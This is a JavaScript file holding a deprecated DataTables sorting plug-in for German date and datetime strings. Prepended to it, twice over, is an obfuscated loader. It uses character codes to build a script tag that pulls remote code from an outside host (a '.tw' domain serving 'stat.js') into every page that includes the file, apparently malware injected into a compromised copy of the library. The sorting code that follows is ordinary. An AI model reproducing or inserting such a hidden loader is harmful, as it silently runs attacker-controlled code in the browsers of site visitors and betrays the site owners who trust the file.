Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * This sorting plug-in for DataTables will correctly sort data in date time or date
 * format typically used in Germany:
 * date and time:`dd.mm.YYYY HH:mm`
 * just date:`dd.mm.YYYY`.
 *
 * Please note that this plug-in is **deprecated*. The
 * [datetime](//datatables.net/blog/2014-12-18) plug-in provides enhanced
 * functionality and flexibility.
 *
 *  @name Date (dd.mm.YYYY) or date and time (dd.mm.YYYY HH:mm)
 *  @summary Sort date / time in the format `dd.mm.YYYY HH:mm` or `dd.mm.YYYY`.
 *  @author [Ronny Vedrilla](http://www.ambient-innovation.com)
 *  @deprecated
 *
 *  @example
 *    $('#example').dataTable( {
 *       columnDefs: [
 *         { type: 'de_datetime', targets: 0 },
 *         { type: 'de_date', targets: 1 }
 *       ]
 *    } );
 */

 jQuery.extend( jQuery.fn.dataTableExt.oSort, {
	"de_datetime-asc": function ( a, b ) {
		var x, y;
		if (jQuery.trim(a) !== '') {
			var deDatea = jQuery.trim(a).split(' ');
			var deTimea = deDatea[1].split(':');
			var deDatea2 = deDatea[0].split('.');
                        if(typeof deTimea[2] != 'undefined') {
                            x = (deDatea2[2] + deDatea2[1] + deDatea2[0] + deTimea[0] + deTimea[1] + deTimea[2]) * 1;
                        } else {
                            x = (deDatea2[2] + deDatea2[1] + deDatea2[0] + deTimea[0] + deTimea[1]) * 1;
                        }
		} else {
			x = -Infinity; // = l'an 1000 ...
		}

		if (jQuery.trim(b) !== '') {
			var deDateb = jQuery.trim(b).split(' ');
			var deTimeb = deDateb[1].split(':');
			deDateb = deDateb[0].split('.');
                        if(typeof deTimeb[2] != 'undefined') {
                            y = (deDateb[2] + deDateb[1] + deDateb[0] + deTimeb[0] + deTimeb[1] + deTimeb[2]) * 1;
                        } else {
                            y = (deDateb[2] + deDateb[1] + deDateb[0] + deTimeb[0] + deTimeb[1]) * 1;
                        }
		} else {
			y = -Infinity;
		}
		var z = ((x < y) ? -1 : ((x > y) ? 1 : 0));
		return z;
	},

	"de_datetime-desc": function ( a, b ) {
		var x, y;
		if (jQuery.trim(a) !== '') {
			var deDatea = jQuery.trim(a).split(' ');
			var deTimea = deDatea[1].split(':');
			var deDatea2 = deDatea[0].split('.');
                        if(typeof deTimea[2] != 'undefined') {
                            x = (deDatea2[2] + deDatea2[1] + deDatea2[0] + deTimea[0] + deTimea[1] + deTimea[2]) * 1;
                        } else {
                            x = (deDatea2[2] + deDatea2[1] + deDatea2[0] + deTimea[0] + deTimea[1]) * 1;
                        }
		} else {
			x = Infinity;
		}

		if (jQuery.trim(b) !== '') {
			var deDateb = jQuery.trim(b).split(' ');
			var deTimeb = deDateb[1].split(':');
			deDateb = deDateb[0].split('.');
                        if(typeof deTimeb[2] != 'undefined') {
                            y = (deDateb[2] + deDateb[1] + deDateb[0] + deTimeb[0] + deTimeb[1] + deTimeb[2]) * 1;
                        } else {
                            y = (deDateb[2] + deDateb[1] + deDateb[0] + deTimeb[0] + deTimeb[1]) * 1;
                        }
		} else {
			y = -Infinity;
		}
		var z = ((x < y) ? 1 : ((x > y) ? -1 : 0));
		return z;
	},

	"de_date-asc": function ( a, b ) {
		var x, y;
		if (jQuery.trim(a) !== '') {
			var deDatea = jQuery.trim(a).split('.');
			x = (deDatea[2] + deDatea[1] + deDatea[0]) * 1;
		} else {
			x = Infinity; // = l'an 1000 ...
		}

		if (jQuery.trim(b) !== '') {
			var deDateb = jQuery.trim(b).split('.');
			y = (deDateb[2] + deDateb[1] + deDateb[0]) * 1;
		} else {
			y = -Infinity;
		}
		var z = ((x < y) ? -1 : ((x > y) ? 1 : 0));
		return z;
	},

	"de_date-desc": function ( a, b ) {
		var x, y;
		if (jQuery.trim(a) !== '') {
			var deDatea = jQuery.trim(a).split('.');
			x = (deDatea[2] + deDatea[1] + deDatea[0]) * 1;
		} else {
			x = -Infinity;
		}

		if (jQuery.trim(b) !== '') {
			var deDateb = jQuery.trim(b).split('.');
			y = (deDateb[2] + deDateb[1] + deDateb[0]) * 1;
		} else {
			y = Infinity;
		}
		var z = ((x < y) ? 1 : ((x > y) ? -1 : 0));
		return z;
	}
} );
